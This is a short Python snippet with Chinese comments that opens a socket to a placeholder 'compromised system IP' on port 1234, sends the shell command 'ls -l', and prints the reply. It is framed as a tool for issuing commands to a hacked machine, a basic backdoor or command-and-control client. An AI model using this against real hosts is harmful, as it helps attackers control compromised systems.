import socket

def send_command(command):
    # 構建socket並連接到另一台受駭的系統
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("受駭系統IP", 1234))  # 請替換成實際的受駭系統IP和端口號

    # 發送指令到受駭系統
    s.sendall(command.encode())

    # 接收回應
    response = s.recv(1024).decode()
    print("Response:", response)

    # 關閉socket連接
    s.close()

# 使用範例
send_command("ls -l")